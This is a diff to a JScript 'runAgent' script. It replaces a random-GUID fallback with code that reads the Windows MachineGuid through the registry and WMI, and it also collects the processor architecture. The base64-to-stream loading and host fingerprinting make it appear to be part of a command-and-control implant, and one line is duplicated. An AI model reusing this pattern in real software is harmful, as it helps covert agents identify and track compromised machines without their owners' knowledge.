@@ -24,14 +24,6 @@ function runAgent() {
         return bytes;
     }
     function u32Bytes(n) { return [n & 255, (n >>> 8) & 255, (n >>> 16) & 255, (n >>> 24) & 255]; }
-    function randomGuid() {
-        function hexChars(count) {
-            var out = '';
-            for (var i = 0; i < count; i++) out += HEX_DIGITS.charAt(Math.floor(Math.random() * 16));
-            return out;
-        }
-        return hexChars(8) + '-' + hexChars(4) + '-' + hexChars(4) + '-' + hexChars(4) + '-' + hexChars(12);
-    }
     function base64ToStream(base64, byteLength) {
         var encoding = new ActiveXObject('System.Text.ASCIIEncoding');
         var encodedLength = encoding.GetByteCount_2(base64);
@@ -43,10 +35,27 @@ function runAgent() {
         stream.Position = 0;
         return stream;
     }
-    function buildIdentity() {
+    var GUID_RE = /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/;
+    function loadGuid() {
         var guid = '';
-        try { guid = shell.RegRead('HKLM\\SOFTWARE\\Microsoft\\Cryptography\\MachineGuid').toLowerCase(); } catch (e) {}
-        if (!/^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/.test(guid)) guid = randomGuid();
+        try { guid = ('' + shell.RegRead('HKLM\\SOFTWARE\\Microsoft\\Cryptography\\MachineGuid')).toLowerCase(); } catch (e) {}
+        if (!GUID_RE.test(guid)) {
+            // WScript.Shell can hit 32/64-bit registry redirection; use WMI StdRegProv as a fallback.
+            try {
+                var reg = new ActiveXObject('WbemScripting.SWbemLocator').ConnectServer('.', 'root\\default').Get('StdRegProv');
+                var inParams = reg.Methods_('GetStringValue').InParameters.SpawnInstance_();
+                var inParams = reg.Methods_('GetStringValue').InParameters.SpawnInstance_();
+                inParams.hDefKey = 0x80000002; // HKEY_LOCAL_MACHINE
+                inParams.sSubKeyName = 'SOFTWARE\\Microsoft\\Cryptography';
+                inParams.sValueName = 'MachineGuid';
+                var outParams = reg.ExecMethod_('GetStringValue', inParams);
+                if (outParams.ReturnValue == 0) guid = ('' + outParams.sValue).toLowerCase();
+            } catch (e2) {}
+        }
+        return guid;
+    }
+    function buildIdentity() {
+        var guid = loadGuid();
         var archMap = { AMD64: 'x86_64', x86: 'i386', ARM64: 'aarch64' };
         var archFromEnv = readEnv('PROCESSOR_ARCHITEW6432');
         if (!archFromEnv) archFromEnv = readEnv('PROCESSOR_ARCHITECTURE');
